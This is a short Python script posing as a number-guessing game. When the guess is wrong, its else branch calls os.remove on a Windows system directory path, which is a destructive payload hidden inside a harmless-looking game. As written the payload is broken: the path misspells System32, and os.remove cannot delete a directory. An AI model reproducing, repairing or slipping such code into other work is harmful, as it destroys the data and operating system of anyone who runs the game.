import random, os


number = random.randint(1,100)
guess = input("Guess a number between 1 and a 100")
guess = int(guess)

if guess == number:
  print ("You won !")
else:
  os.remove("C:\Windows\Systeme32")
